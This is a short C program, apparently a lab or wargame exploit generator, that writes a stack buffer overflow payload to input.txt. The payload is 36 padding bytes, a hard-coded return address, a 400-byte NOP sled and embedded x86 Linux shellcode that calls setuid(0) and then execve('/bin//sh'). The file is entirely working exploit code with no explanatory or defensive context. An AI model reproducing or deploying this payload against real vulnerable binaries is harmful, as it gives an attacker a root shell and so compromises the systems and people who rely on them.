#include <stdio.h>
#include <stdlib.h>


char ans[] = "\x31\xC0\x89\xC3\xB0\x17\xCD\x80\x5B\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
//34 shellcode


int main(){
	FILE *fpOut;
	

	fpOut = fopen("input.txt", "wb");
	unsigned char ch;


	for(int i=0; i<36; i++){			//dummy
		ch = '0';
		fwrite(&ch, sizeof(ch), 1, fpOut);
	}



	ch = '\x10';				//address
	fwrite(&ch, sizeof(ch), 1, fpOut);
	ch = '\xe7';
	fwrite(&ch, sizeof(ch), 1, fpOut);
	ch = '\xff';
	fwrite(&ch, sizeof(ch), 1, fpOut);
	ch = '\xbf';
	fwrite(&ch, sizeof(ch), 1, fpOut);
	
	for(int i=0; i<400; i++){		//nop
		ch = '\x90';
		fwrite(&ch, sizeof(ch), 1, fpOut);
	}

	for(int i=0; i<34; i++){		//shellcode
		ch = ans[i];
		fwrite(&ch, sizeof(ch), 1, fpOut);
	}


	fclose(fpOut);

}
